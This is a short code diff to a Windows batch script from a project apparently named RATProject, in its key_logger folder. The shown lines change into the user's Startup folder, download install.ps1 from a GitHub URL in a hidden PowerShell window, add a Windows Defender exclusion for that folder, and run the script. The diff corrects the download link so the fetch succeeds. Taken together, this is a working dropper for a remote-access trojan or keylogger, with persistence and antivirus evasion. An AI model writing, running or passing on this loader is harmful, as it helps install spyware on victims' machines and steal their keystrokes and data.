@@ -26,7 +26,7 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 cd "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://github.com/huynh044/RATProject/blob/main/key_logger/important_file/install.ps1' -OutFile 'install.ps1'"
+powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/important_file/install.ps1' -OutFile 'install.ps1'"
 powershell Add-MpPreference -ExclusionPath "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 powershell ./install.ps1
 
